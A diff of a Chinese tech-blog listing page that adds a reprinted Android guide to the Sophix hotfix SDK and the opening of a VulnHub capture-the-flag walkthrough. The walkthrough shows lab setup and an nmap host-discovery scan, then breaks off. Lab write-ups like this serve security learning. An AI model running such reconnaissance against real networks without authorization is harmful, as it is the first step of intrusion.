@@ -14,7 +14,7 @@
     <meta name="description" content="Open your eyes to see the light in life">
 <meta property="og:type" content="website">
 <meta property="og:title" content="氕氘氚">
-<meta property="og:url" content="http://example.com/categories/Technology/page/4/index.html">
+<meta property="og:url" content="https://szczecin.github.io/categories/Technology/page/4/index.html">
 <meta property="og:site_name" content="氕氘氚">
 <meta property="og:description" content="Open your eyes to see the light in life">
 <meta property="og:locale">
@@ -81,6 +81,272 @@
 
 
 <section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/15/Aliyun-Sophix/">
+                阿里热修复Sophix的使用指南
+            </a>
+        </h2>
+    
+    <time>
+        Jan 15, 2024
+    </time>
+    <section class="content">
+        <h1><span id="阿里热修复sophix的使用指南">阿里热修复Sophix的使用指南</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://juejin.cn/post/7250377976134533177">五问</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-阿里云热修复sophix的介绍">一、阿里云热修复Sophix的介绍</span></h2><h3><span id="11-首先看一下市场上热修复方案的比较">1.1、首先看一下市场上热修复方案的比较：</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434850.html">https://help.aliyun.com/document_detail/434850.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="12-收费情况">1.2、收费情况：</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434858.html">https://help.aliyun.com/document_detail/434858.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="二-接入指南">二、接入指南</span></h2><h3><span id="21-准备">2.1、准备</span></h3><blockquote>
+<ol>
+<li>准备好阿里云账号</li>
+<li>进行身份实名认证</li>
+<li><a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">移动研发平台EMAS</a>，进行项目创建,创建后会生成一个<code>aliyun-emas-services.json 文件</code>，里面包含了热修复sdk接入时所需的密钥，很重要</li>
+</ol>
+</blockquote>
+<h3><span id="22-emas平台的添加流程如下">2.2、EMAS平台的添加流程如下：</span></h3><h4><span id="221-添加应用">2.2.1、添加应用</span></h4><blockquote>
+<p><img src="/2024/01/15/Aliyun-Sophix/3.png" alt="image"></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/4.png" alt="image"></p>
+<p>生成应用的key信息文件，如果建议按需接入所需功能，没必要也不安全，按下图将文件放入到app中</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/5.png" alt="image"></p>
+<p>下图的红框中的添加sdk也是，添加emas平台中的所有功能，建议按需接入某个功能（如：热修），另外该插件在Android <code>gradle 7</code>之上会报错</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="23-热修复接入">2.3、热修复接入</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434883.html">https://help.aliyun.com/document_detail/434883.html</a></p>
+<p><strong>注意点如下：</strong></p>
+<p>使用<code>gradle plugin版本高于4.2时</code>，可能会自动开启资源优化。开启资源优化后，资源名称被混淆，会导致补丁工具在生成补丁时一直卡在”开始构建补丁…..”，无法正常解析apk包。<code>解决方案：在gradle.properties 中新增android.enableResourceOptimizations=false，</code>重新生成基线包和修复包，然后再生成补丁。</p>
+<p>密钥的使用推荐在<code>SophixStubApplication 中初始化</code>，而<code>不是在AndroidManifest文件中配置</code></p>
+<p>使用android studio打包生成apk时，要关闭instant run。</p>
+<p><a href="https://link.juejin.cn/?target=https://help.aliyun.com/document_detail/434885.htm%23h3-h2c-ysc-sto">queryAndLoadNewPatch方法</a>用来请求控制台发布的补丁包，会涉及设备信息读取，所以必须在用户同意隐私协议之后调用。另外用户可根据业务情况，酌情考虑是否打开此开关。</p>
+<p>但不可放在attachBaseContext中，否则无网络权限，建议放在主进程用户同意隐私协议之后的任意时刻。</p>
+<p>接入流程步骤如下：</p>
+<p><strong>添加工程依赖</strong></p>
+<h4><span id="1-android-studio集成方式">1. Android Studio集成方式</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gradle远程仓库依赖, 打开项目找到App的build.gradle文件，添加如下配置：</span><br><span class="line"></span><br><span class="line">添加Maven仓库地址：</span><br><span class="line"></span><br><span class="line">****</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">repositories &#123;</span></span><br><span class="line"><span class="string">   maven &#123;</span></span><br><span class="line"><span class="string">       url &quot;http://maven.aliyun.com/nexus/content/repositories/releases&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>
+
+<h4><span id="2添加gradle坐标版本依赖">2.添加gradle坐标版本依赖：</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ......</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.xxx.xxx&quot;</span> <span class="comment">//包名</span></span><br><span class="line">        ......</span><br><span class="line">        ndk &#123;</span><br><span class="line">            <span class="comment">//选择要添加的对应cpu类型的.so库。</span></span><br><span class="line">            <span class="comment">//热修复支持五种</span></span><br><span class="line">            abiFilters <span class="string">&#x27;arm64-v8a&#x27;</span>, <span class="string">&#x27;armeabi&#x27;</span>, <span class="string">&#x27;armeabi-v7a&#x27;</span>, <span class="string">&#x27;x86&#x27;</span>, <span class="string">&#x27;x86_64&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;</span><br><span class="line">    ......</span><br><span class="line">        compile <span class="string">&#x27;com.aliyun.ams:alicloud-android-hotfix:3.3.5&#x27;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="3添加应用权限">3.添加应用权限</span></h4><p>Sophix SDK使用到以下权限，使用Maven依赖或者aar依赖可以不用配置。具体配置在AndroidManifest.xml中。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="4配置androidmanifest文件">4.配置AndroidManifest文件</span></h4><p><code>也可以不用配置(直接在SophixStubApplication，文件中初始化配置即可（推荐在SophixStubApplication中配置）)</code>，在 <a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">移动研发平台EMAS</a>，进行项目创建,创建后会生成一个<code>aliyun-emas-services.json 文件</code>，里面包含了热修复sdk接入时所需的密钥</p>
+<p>在<code>AndroidManifest.xml</code>中间的<code>application</code>节点下添加如下配置：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.IDSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App ID&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.APPSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App Secret&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.RSASECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;RSA密钥&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="5-混淆配置按需配置">5. 混淆配置,按需配置</span></h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">#基线包使用，生成mapping.txt</span></span><br><span class="line">-printmapping mapping.txt</span><br><span class="line"><span class="meta">#生成的mapping.txt在app/build/outputs/mapping/release路径下，移动到/app路径下</span></span><br><span class="line"><span class="meta">#修复后的项目使用，保证混淆结果一致</span></span><br><span class="line"><span class="meta">#-applymapping mapping.txt</span></span><br><span class="line"><span class="meta">#hotfix</span></span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.taobao.sophix</span>.**&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.ta.utdid2.device</span>.**&#123;*;&#125;</span><br><span class="line"><span class="meta">#防止inline</span></span><br><span class="line">-dontoptimize</span><br><span class="line">```</span><br><span class="line">**</span><br><span class="line">**重要**</span><br><span class="line"></span><br><span class="line">开启混淆时，生成修复包要使用旧包的mapping文件以保证混淆结果一致。</span><br><span class="line">初始化</span><br></pre></td></tr></table></figure>
+
+<h4><span id="6-初始化">6. 初始化</span></h4><p>初始化的调用应该尽可能的早，必须在<code>Application.attachBaseContext()</code>的最开始（在super.attachBaseContext之后，如果有Multidex，也需要在Multidex.install之后）进行SDK初始化操作，初始化之前不能用到其他自定义类，否则极有可能导致崩溃。而查询服务器是否有可用补丁的操作可以在后面的任意地方。不建议在<code>Application.onCreate()</code>中初始化，因为如果带有ContentProvider，就会使得Sophix初始化时机太迟从而引发问题。</p>
+<p>Sophix最新版本引入了新的初始化方式。</p>
+<p>原来的初始化方式仍然可以使用。只是新方式可以提供更全面的功能修复支持，将会带来以下优点：</p>
+<ul>
+<li>初始化与应用原先业务代码完全隔离，使得原先真正的Application可以修复，并且减少了补丁预加载时间等等。</li>
+<li>新方式能够更完美地兼容Android 8.0以后版本。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SophixStubApplication</span> <span class="keyword">extends</span> <span class="title class_">SophixApplication</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;SophixStubApplication&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">appVersion</span> <span class="operator">=</span> <span class="string">&quot;0.0.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此处SophixEntry应指定真正的Application，并且保证RealApplicationStub类名不被混淆。</span></span><br><span class="line">    <span class="meta">@SophixEntry(MyApplication.class)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RealApplicationStub</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">attachBaseContext</span><span class="params">(Context base)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.attachBaseContext(base);</span><br><span class="line">        initSophix();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initSophix</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            appVersion = <span class="built_in">this</span>.getPackageManager()</span><br><span class="line">                    .getPackageInfo(<span class="built_in">this</span>.getPackageName(), <span class="number">0</span>)</span><br><span class="line">                    .versionName;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">SophixManager</span> <span class="variable">instance</span> <span class="operator">=</span> SophixManager.getInstance();</span><br><span class="line">        List&lt;String&gt; tags = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">///todo 构建正式包之前需要修改为：</span></span><br><span class="line">        <span class="comment">///tags.add(&quot;production&quot;);</span></span><br><span class="line">        tags.add(<span class="string">&quot;test&quot;</span>); <span class="comment">//这个值就是，你进行灰度包热修时，要填写的tag</span></span><br><span class="line">        <span class="keyword">for</span> (String tag : tags) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;sophix tag:&quot;</span> + tag);</span><br><span class="line">        &#125;</span><br><span class="line">        instance.setContext(<span class="built_in">this</span>)</span><br><span class="line">                .setAppVersion(appVersion)</span><br><span class="line">                .setEnableDebug(<span class="literal">false</span>)</span><br><span class="line">                .setEnableFullLog()</span><br><span class="line">                .setTags(tags)</span><br><span class="line">                .setSecretMetaData(<span class="string">&quot;你自己的hotfix.idSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;你自己的emas.appSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;你自己的hotfix.rsaSecret&quot;</span>)</span><br><span class="line">                .setPatchLoadStatusStub(<span class="keyword">new</span> <span class="title class_">PatchLoadStatusListener</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> mode, <span class="keyword">final</span> <span class="type">int</span> code, <span class="keyword">final</span> String info, <span class="keyword">final</span> <span class="type">int</span> handlePatchVersion)</span> &#123;</span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;sophix handlePatchVersion:&quot;</span> + handlePatchVersion + <span class="string">&quot; /code:&quot;</span> + code + <span class="string">&quot; /info:&quot;</span> + info);</span><br><span class="line">                        <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_SUCCESS) &#123;</span><br><span class="line">                            <span class="comment">///重启后会装载补丁会调用该方法</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix load patch &quot;</span> + handlePatchVersion + <span class="string">&quot; success!&quot;</span> + info);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_RELAUNCH) &#123;</span><br><span class="line">                            <span class="comment">///补丁加载成功会调用该方法</span></span><br><span class="line">                            <span class="comment">// 如果需要在后台重启，建议此处用SharePreference保存状态。</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix preload patch success. restart app to make effect. handlePatchVersion:&quot;</span> + handlePatchVersion);</span><br><span class="line">                          </span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                            intent.putExtra(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;恭喜你，成功接收到发送的广播&quot;</span> + PatchStatus.CODE_LOAD_RELAUNCH);</span><br><span class="line">                            intent.setAction(<span class="string">&quot;可使用重启广播重启&quot;</span>);</span><br><span class="line">                            sendBroadcast(intent);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="7最后需要把androidmanifest里面的application改为这个新增的sophixstubapplication类">7.最后，需要把AndroidManifest里面的application改为这个新增的SophixStubApplication类：</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line">        android:name=&quot;com.my.pkg.SophixStubApplication&quot;</span><br><span class="line">        ... ...&gt;</span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>
+
+<p>这样便完成了新方式的初始化接入改造。</p>
+</blockquote>
+<h2><span id="三-热修复打差量包流程-热修控制台地址">三、热修复打差量包流程 热修控制台地址</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://emas.console.aliyun.com/service/devTool/hotfix/patch">https://emas.console.aliyun.com/service/devTool/hotfix/patch</a></p>
+</blockquote>
+<h3><span id="31-找到热修界面添加应用">3.1、找到热修界面添加应用</span></h3><blockquote>
+<p>如下图：<strong>注意</strong>应用版本必须与你的<code>versionName</code>一致，否则会<code>导致后续下发查找不到差量包</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/7.png" alt="image"></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="32-打差量包">3.2、打差量包</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434864.html">https://help.aliyun.com/document_detail/434864.html</a></p>
+<ol>
+<li>准备好SophixPatchTool_windows打包工具各版本打包工具如下:</li>
+</ol>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_macos.zip">Mac版本打包工具下载</a></li>
+<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_windows.zip">Windows版本打包工具下载</a></li>
+<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_linux.zip">Linux版本打包工具地址</a></li>
+</ul>
+<ol>
+<li>打一个release的包</li>
+<li>再第2步的release包的基础上修改一些内容，在打一个release包</li>
+<li>利用工具开始打包，如下图</li>
+</ol>
+<p><strong>注意：</strong> 每次热修差量包的生成的基础包就是你上次发版后的包，并不是说你在进行第三次热修时，用第二次的热修包，作为基准包</p>
+<p><code>问题包：1.0-querelease-2022-12-07.apk，修复包：1.0-release-2022-12-07.apk</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/9.png" alt="image"></p>
+<p><code>打开工具：</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/10.png" alt="image"></p>
+<p><code>选择两个包填充</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/11.png" alt="image"></p>
+<p><code>选择设置填好keystore</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/12.png" alt="image"></p>
+<p><code>选择高级，默认如下图，强制冷启动就是补丁包下发后必须重启，建议勾选强制冷启动，为何：看下面解释</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/13.png" alt="image"></p>
+<p><code>Sophix何时走即时生效热修复，何时走冷启动修复？</code><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907">https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907</a></p>
+<p><code>配置完成后点击Go开始打差量包</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/14.png" alt="image"></p>
+<p><code>成功</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/15.png" alt="image"></p>
+<p><code>sophix-patch.jar 就是打出的差量包</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="四-上传补丁-发布">四、上传补丁-发布</span></h2><h3><span id="41-添加你的应用版本然后上传补丁">4.1、添加你的应用版本，然后上传补丁</span></h3><blockquote>
+<p><img src="/2024/01/15/Aliyun-Sophix/17.png" alt="image"></p>
+</blockquote>
+<h3><span id="42-发布补丁">4.2、发布补丁</span></h3><blockquote>
+<p><code>上传后点击发布如下图</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/18.png" alt="image"></p>
+<p><code>下载[hotfixdebug]工具验证你的补丁包是否成功</code>,调试流程原文如下链接：</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434866.html">https://help.aliyun.com/document_detail/434866.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/19.png" alt="image"></p>
+<p>调试没问题后点击上图的<code>新建发布</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/20.png" alt="image"></p>
+<p>发布的话：有全量，灰度两种，<code>灰度的话</code> ，需要设置指定标签<code>tag</code>，就是你的应用app中Sophix所配置的，如下图：（推荐是全量）</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/21.png" alt="image"></p>
+</blockquote>
+<h3><span id="43-发布成功后在app中调用查询补丁方法">4.3、发布成功后在app中调用查询补丁方法</span></h3><blockquote>
+<h3><span id="sophixmanagergetinstancequeryandloadnewpatch"><code>SophixManager.getInstance().queryAndLoadNewPatch()</code></span></h3><p>后续将回调<code>PatchLoadStatusListener</code>如下图</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/22.png" alt="image"></p>
+<p>依次出现热修状态码如下，状态码含义：</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA">https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/23.png" alt="image"></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/24.png" alt="image"></p>
+<p><strong>上图加载成功后提示需要重启后热修生效</strong></p>
+</blockquote>
+<h2><span id="五-测试用例">五、测试用例</span></h2><blockquote>
+<p><strong>1.</strong> 修改一个toast文案，然后修复成功。</p>
+<p><strong>2.</strong> 修改一张图片，增加一张新的图片进行展示，增加点击效果，增加一个新的类生成提示文案（mipmap-hdpi、drawable-xhdpi、drawable、都添加图片）</p>
+<p>drawable-xhdpi 中新增热修图片添加可能会存在问题：如下，然后按要求在drawable 中添加后，热修成功。</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/338384.html">https://help.aliyun.com/document_detail/338384.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/25.png" alt="image"></p>
+<p><strong>3.</strong> 添加assets文件，热修成功。 </p>
+<p><strong>4.</strong> <code>四大组件不行</code>，因为需要在AndroidManifest.xml文件中配置，热修的时候使用的话会报找不到的，需要注册异常，如下图</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/26.png" alt="image"></p>
+<p><strong>5.</strong> 删除测试4中的组件跳转流程，热修测试成功，</p>
+<p><strong>6.</strong> 删除测试2中添加的xml中的代码与相关资源，热修测试成功</p>
+<p>注意：</p>
+<p> 1.热修包存在的话，每杀死app，初始化进来都会走</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onLoad方法的回调</span><br><span class="line"></span><br><span class="line"><span class="attr">code</span> == PatchStatus.CODE_LOAD_SUCCESS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/15/Aliyun-Sophix/27.png" alt="image"></p>
+<p>2.同一个热修包，设置不同的tag，然后点击下发的话都会下发一次</p>
+<p>3.清除热修包后，之前发布的版本都无效了，再次查询加载，都查不到了，只能之后在这个版本重新发布</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SophixManager<span class="selector-class">.getInstance</span>()<span class="selector-class">.cleanPatches</span>()</span><br></pre></td></tr></table></figure>
+
+<p>热修复书籍：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/115122">https://developer.aliyun.com/article/115122</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Sophix/" rel="tag">Sophix</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/11/WhoWantsToBeKing-1/">
+                WHO WANTS TO BE KING 1
+            </a>
+        </h2>
+    
+    <time>
+        Dec 11, 2023
+    </time>
+    <section class="content">
+        <h1><span id="who-wants-to-be-king-1">WHO WANTS TO BE KING: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称who-wants-to-be-king-1">名称：Who Wants To Be King: 1</span></h4><h4><span id="发布日期2020121">发布日期：2020.12.1</span></h4><h4><span id="作者bjorn">作者：Bjorn</span></h4><h4><span id="系列who-wants-to-be-king">系列：Who Wants To Be King</span></h4><h4><span id="推特armbjorn">推特：@ArmBjorn</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;nice.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名whowantstobekingova">文件名：whowantstobeking.ova</span></h4><h4><span id="文件大小24gb">文件大小：2.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwhowantstobekingwhowantstobekingova">下载地址：</span></h4><h4><span id="md5-5b8bdcc5c24a3705c88f969b47a7199b">MD5: 5B8BDCC5C24A3705C88F969B47A7199B</span></h4><h4><span id="sha1-0114959a45db91f699594d1476ab900f610681ca">SHA1: 0114959A45DB91F699594D1476AB900F610681CA</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机whowantstobeking和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/12/11/WhoWantsToBeKing-1/2.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
